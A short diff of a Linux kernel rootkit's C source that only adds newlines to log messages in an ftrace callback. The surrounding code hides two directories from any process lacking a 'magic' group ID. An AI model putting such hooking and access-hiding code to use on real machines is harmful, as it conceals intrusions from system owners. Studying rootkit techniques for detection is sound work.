@@ -74,7 +74,7 @@ static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip,
       if (caller_has_magic_gid() == false) {
         fregs->regs[1] = 0;               //deny access   
         //ftrace_regs_set_argument(fregs, 1, 0)
-        pr_info("[rootkit][blocking] blocked access to %s", HIDDEN_DIR_1);
+        pr_info("[rootkit][blocking] blocked access to %s\n", HIDDEN_DIR_1);
       }
     } 
   }
@@ -85,7 +85,7 @@ static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip,
       if (caller_has_magic_gid() == false) {
         fregs->regs[1] = 0;               //deny access   
         //ftrace_regs_set_argument(fregs, 1, 0)
-        pr_info("[rootkit][blocking] blocked access to %s", HIDDEN_DIR_2);
+        pr_info("[rootkit][blocking] blocked access to %s\n", HIDDEN_DIR_2);
       }
     } 
   }
